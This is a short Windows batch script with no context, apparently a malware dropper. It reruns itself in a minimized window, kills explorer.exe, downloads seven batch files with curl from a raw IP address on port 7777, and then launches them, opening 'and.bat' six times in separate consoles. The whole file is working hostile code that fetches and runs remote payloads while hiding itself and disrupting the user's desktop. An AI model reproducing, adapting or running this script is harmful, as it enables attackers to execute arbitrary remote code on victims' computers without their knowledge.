if "%1" == "" start "" /min "%~dpnx0" MY_FLAG && exit
taskkill /F /IM explorer.exe
cd C:\configuration
curl http://111.90.151.174:7777/hit.bat -O
curl http://111.90.151.174:7777/and.bat -O
curl http://111.90.151.174:7777/run.bat -O
curl http://111.90.151.174:7777/5201.bat -O
curl http://111.90.151.174:7777/kill.bat -O
curl http://111.90.151.174:7777/part2.bat -O
curl http://111.90.151.174:7777/part3.bat -O
start cmd.exe /k "C:\configuration\5201.bat"
start cmd.exe /k "C:\configuration\and.bat"
cd C:\configuration
start cmd.exe /k "C:\configuration\and.bat"
cd C:\configuration
start cmd.exe /k "C:\configuration\and.bat"
cd C:\configuration
start cmd.exe /k "C:\configuration\and.bat"
cd C:\configuration
start cmd.exe /k "C:\configuration\and.bat"
cd C:\configuration
start cmd.exe /k "C:\configuration\and.bat"
exit
